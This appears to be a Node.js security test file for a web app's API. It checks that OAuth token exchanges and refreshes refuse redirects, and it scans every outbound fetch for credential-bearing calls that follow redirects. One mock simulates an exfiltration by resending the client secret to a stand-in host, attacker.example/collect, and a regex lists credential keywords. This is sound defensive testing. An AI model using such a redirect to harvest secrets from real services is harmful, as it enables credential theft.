// A request that carries a secret never follows a redirect (api/**).
//
// A 307 or 308 makes fetch resend the same body to the Location, so a token
// exchange or a refresh would hand the client secret, the code or the refresh
// token to another host. Each such fetch sets redirect: 'error', and a
// redirect answer is a failed exchange with a fixed code.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';

const SECRET = 'client-secret-must-not-travel';

// What fetch does with redirect: 'error' when the server answers a redirect:
// it throws; with 'follow' it would make a second request to the Location.
function redirectingProvider() {
  const requests = [];
  const fetchImpl = async (url, init = {}) => {
    requests.push({ url: String(url), body: String(init.body || ''), redirect: init.redirect });
    if (requests.length > 1) return Response.json({ access_token: 'stolen' });
    if (init.redirect === 'error') throw new TypeError('fetch failed: redirect mode is set to error');
    return fetchImpl('https://attacker.example/collect', init);
  };
  return { requests, fetchImpl };
}

test('the OAuth code exchange does not follow a redirect and answers a fixed code', async (t) => {
  const saved = { ...process.env };
  t.after(() => { process.env = saved; });
  Object.assign(process.env, {
    EXTERNAL_OAUTH_STATE_SECRET: 'state-secret-0123456789abcdef',
    GOOGLE_OAUTH_CLIENT_ID: 'client-id', GOOGLE_OAUTH_CLIENT_SECRET: SECRET,
  });
  const { signState, OAUTH_STATE_COOKIE } = await import('../../api/_lib/external-connections.js');
  const { default: callback } = await import('../../api/external-connect-callback.js');
  const state = signState({ u: 'u-1', p: 'google', n: 'nonce', e: Date.now() + 60_000 });
  const { requests, fetchImpl } = redirectingProvider();
  t.mock.method(globalThis, 'fetch', fetchImpl);
  const res = { headers: {}, statusCode: 0, body: '', setHeader(k, v) { this.headers[k.toLowerCase()] = v; return this; }, status(c) { this.statusCode = c; return this; }, json(b) { this.body = JSON.stringify(b); return this; }, end(b) { if (b) this.body = String(b); return this; } };
  await callback({ method: 'GET', query: { provider: 'google', state, code: 'the-code' }, headers: { host: 'vetmock.com', cookie: `${OAUTH_STATE_COOKIE}=${state}` }, socket: {} }, res);
  assert.equal(requests.length, 1, 'no second request to the redirect\'s host');
  assert.equal(requests[0].redirect, 'error');
  assert.ok(requests[0].body.includes(SECRET), 'the one request is the real exchange');
  assert.equal(res.statusCode, 302);
  assert.equal(res.headers.location, '/app/library?connect_error=exchange', 'a fixed code');
  assert.doesNotMatch(`${res.headers.location} ${res.body}`, /redirect mode|fetch failed|attacker|secret/i, 'no provider or fetch text');
});

test('the Google refresh does not follow a redirect and reads as a failed refresh', async (t) => {
  const saved = { ...process.env };
  t.after(() => { process.env = saved; });
  Object.assign(process.env, { GOOGLE_OAUTH_CLIENT_ID: 'client-id', GOOGLE_OAUTH_CLIENT_SECRET: SECRET });
  const { refreshGoogleAccess } = await import('../../api/_lib/external-connections.js');
  const { requests, fetchImpl } = redirectingProvider();
  const out = await refreshGoogleAccess({ user_id: 'u-1', refresh_token: 'refresh-token-value', access_token: 'old' }, { fetch: fetchImpl, url: 'https://db.example', key: 'k' });
  assert.equal(out, null);
  assert.equal(requests.length, 1);
  assert.equal(requests[0].redirect, 'error');
  assert.ok(requests[0].body.includes('refresh-token-value'));
});

// ── Every outbound request under api/ ───────────────────────────────────────

const API = fileURLToPath(new URL('../../api/', import.meta.url));
const files = [];
(function walk(d) { for (const n of readdirSync(d)) { const p = join(d, n); if (statSync(p).isDirectory()) walk(p); else if (n.endsWith('.js')) files.push(p); } })(API);

function fetchCalls(src) {
  const out = [];
  const re = /(?:await|return|=)\s*(fetch|fetchImpl)\(/g;
  let m;
  while ((m = re.exec(src))) {
    let depth = 0, end = -1;
    for (let i = m.index + m[0].length - 1; i < src.length; i++) {
      if (src[i] === '(') depth++;
      else if (src[i] === ')' && !--depth) { end = i; break; }
    }
    if (end > 0) out.push({ line: src.slice(0, m.index).split('\n').length, text: src.slice(m.index, end + 1) });
  }
  return out;
}

// Requests that follow a redirect, each with why it is safe: nothing secret in
// a header other than Authorization (which fetch drops on a redirect to another
// origin) and no body. A key in the query string is not resent: the next
// request goes to the Location the server named.
const FOLLOWS = {
  'fetch-external-doc.js': 'a public page read; the Drive export, which may be answered from googleusercontent.com and checks where it landed (Authorization only)',
  'playlist.js': 'YouTube Data API and RSS: a key in the query, no body',
  'video-file.js': 'a presigned storage URL (the signature is the URL)',
  '_lib/ai/papers.js': 'public paper indexes',
  '_lib/system-status.js': 'a public status file, a presigned URL and the domain registry',
};
const CREDENTIAL = /Authorization|apikey|api-key|x-goog-api-key|xi-api-key|client_secret|refresh_token|Bearer|headers(?:,|:\s*(?:req|tokenReq|upstreamHeaders|headers)\b)|body:/i;

test('every fetch under api/ that carries a credential or a body sets redirect: \'error\'', () => {
  const offenders = [];
  let total = 0;
  for (const f of files) {
    const name = relative(API, f).replace(/\\/g, '/');
    const src = readFileSync(f, 'utf8').replace(/\r\n/g, '\n');
    for (const c of fetchCalls(src)) {
      total++;
      const redirect = /redirect:\s*'(\w+)'/.exec(c.text)?.[1];
      if (redirect === 'error') continue;
      if (CREDENTIAL.test(c.text) && !(redirect === 'follow' && FOLLOWS[name])) offenders.push(`${name}:${c.line} (${redirect || 'follows by default'})`);
      else if (!CREDENTIAL.test(c.text) && !FOLLOWS[name]) offenders.push(`${name}:${c.line} follows: add it to FOLLOWS with why, or set redirect: 'error'`);
    }
  }
  assert.ok(total >= 40, `fetch calls found: ${total}`);
  assert.deepEqual(offenders, []);
});
